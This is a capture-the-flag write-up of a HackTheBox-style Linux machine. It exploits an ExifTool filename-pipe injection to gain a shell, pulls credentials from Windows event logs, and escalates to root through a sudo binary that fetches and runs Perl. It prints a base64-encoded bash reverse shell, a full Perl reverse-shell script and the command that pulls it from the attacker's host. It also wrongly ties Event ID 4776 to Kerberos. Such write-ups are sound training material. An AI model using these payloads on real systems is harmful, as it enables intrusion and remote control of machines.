## Enuemration :

I started with q qucik rustscan & observed only 2 open ports on the network, i.e 22 & 80

![image](https://user-images.githubusercontent.com/87700008/221355635-38b21308-4d60-427d-b5c4-ec39f8a8f594.png)

    - 22 open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    - 80 open http syn-ack ttl 63 Apache httpd 2.4.41
    
In the port scan results I found a domain as well 'http://eforenzics.htb/' , which I added to /etc/hosts file.
Browsed through the website & found an upload image options for forensics results.

Then I proceeded with the subdomain scanning of the webserver & found only 1 result in it '/assets'

I then tried to accessing the '/assets' but got 403 error.

Then I tried to upload the .php file in hope to get some shell but the filters are blocking the upload other than .jpg & .png.
I tried many filters to bypass but it wasn't working.

Then after multiple failure I uploaded regular PNG image & it gave the the forensics results of the image.

I observed that the website is using the 'ExifTool ver 12.37' for the image forensics purpose.

![image](https://user-images.githubusercontent.com/87700008/221406990-c08f0376-9fcc-4a3b-ab76-fdbedf912943.png)

Searching the exploit for this version I landed on this [page.](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)
Which states "An attacker can pass a filename that ends with a pipe (|) to exiftool and if it exists on the filesystem, execute it as an operating system command."

I tried the same using burp & to test it I first started the tcpdump & icmp server to check if I get any response from the machine or not. And I got the response from the host.

    sudo tcpdump icmp -i tun0 -v

After the confirmation that the website is responding & exiftool is vulnerable now it's time for the Rev Shell.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access :

I tried injection the regular bash payload for reverse shell but didn't received any shell, there may be some filters running on the website.
I then encoded the payload in base64 format & appended the decode function after it so that we can execute the payload as well.

    echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NS81MyAwPiYxCg==' | base64 -d | bash|

This time I received the reverse shell with the user running '**www-data**', then stabilized the shell.

I got a user folder in the home directory 'smorton', but I don't have access for his folder.

![image](https://user-images.githubusercontent.com/87700008/221428367-d7865d17-d9d8-4042-9ee1-887142c1f91b.png)

I then tried to check for the vectors of priv esc but few of the methods are asking for user password which I don't have.
I then ran 'linpeas' to check for possible priv esc vectors, I found a cronjob running from '**/usr/bin/crontab**' which is performing some activity in this folder '**/usr/local/investigation/analysed_log**'

![image](https://user-images.githubusercontent.com/87700008/221429059-806cdb8c-5197-4910-8015-11281a387c52.png)

Then I started digging the '**/usr/local/investigation/**' path & found one .msg file there, i.e. '**Windows Event Logs for Analysis.msg**'
I transferred this file into my machine & checked it's content online as I don't have any email reader in kali machine.

![image](https://user-images.githubusercontent.com/87700008/221429231-eb81053e-d8f8-477c-ae45-a8f9a62f317e.png)

I downloaded the e-mail attachment in my machine as well. After unzipping the attachment I got another file '**security.evtx**' which is a Windows log event file.

![image](https://user-images.githubusercontent.com/87700008/221603664-b818713d-4b2a-4bac-be23-68e844f47e96.png)

I tried to read it's content but it's not in the humand readable format so then I used a script from this [GitHub repo](https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py) to dump the file in the humand readable format.

![image](https://user-images.githubusercontent.com/87700008/221610703-a611b949-e510-4bef-99b4-e462cbf5ef8e.png)
![image](https://user-images.githubusercontent.com/87700008/221610779-c14d1770-15d7-4999-ba51-4e89f2bc5f4c.png)

When checking the dump file, I found some credentials in that dump file. As the dump file is too big I used the event code '4776' to check for any intresting strings.
    
    Event ID 4776 is a security-related event that is logged when a computer attempts to authenticate a user account using Kerberos authentication. This event is triggered when an authentication attempt fails, and helps identify where the failure occurred.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## User flag:

I tried to use the gathered credentials with 'Smorton' account to login. And successfully logged in using SSH. (pwn3d!ðŸ™‚)

After logging in I got the user flag into 'smorton' home directory.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Priv Esc:

I started with the manual enumeration & checked for the sudo permissions 'sudo -l' & got this :

So, then I checked the 'binary' file using string command but the information is not clear in it:

![image](https://user-images.githubusercontent.com/87700008/221628425-220d6429-b93b-4292-a638-127a95e58a60.png)


*At this point I was stucked & executed the LinPeas as well to find the other possible vectors as well but didn't found any. So, then I checked for the hints online & got this [walkthrough](https://systemweakness.com/hackthebox-linux-box-investigation-e64b97ca7876)*

In the blog, I found that he the author uploaded the binary file to [online decompile](https://dogbolt.org/) & then reviewed the source code.

He extracted the main function of the binary, that can be seen in couple of parts.

```int32_t main(int32_t argc, char** argv, char** envp)
{
    if (argc != 3)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (getuid() != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (strcmp(argv[2], "lDnxUysaQn") != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    puts("Running... ");
    FILE* rax_8 = fopen(argv[2], &data_2027);
    int64_t rax_9 = curl_easy_init();
    int32_t var_40 = 0x2712;
    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
    int32_t var_3c = 0x2711;
    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
    int32_t var_38 = 0x2d;
    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
    if (curl_easy_perform(rax_9) != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
    char* rax_28 = malloc((rax_25 + 1));
    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
    char* rax_40 = malloc((rax_37 + 1));
    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
    fclose(rax_8);
    curl_easy_cleanup(rax_9);
    setuid(0);
    system(rax_40);
    system("rm -f ./lDnxUysaQn");
    return 0;
}
```

Firstly, it checks whether three input parameters have been sent through (actually two because the first parameter is the program name itself) and exits if not.

Secondly, it checks whether a root user calls it (achievable because we can run it as root without a password) and exits if not.

Thirdly, it checks whether the third parameter is equal to the string lDnxUysaQn, and exits if not.

Fourthly, it opens a file with curl which is specified by the second parameter and reads and runs with perl.

And it can be seen that the machine would send the get request to the specified URL.

I then hosted a perl based revsershell in my kali machine :

``` use Socket;
$i="[My_IP_here]";
$p=53;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
 open(STDIN,">&S");open(STDOUT,">&S");
 open(STDERR,">&S");exec("/bin/bash -i");
};
```

I then executed the command & got the shell. (pwn3d!ðŸ™‚)

    sudo /usr/bin/binary 10.10.X.X/shell.pl lDnxUysaQn
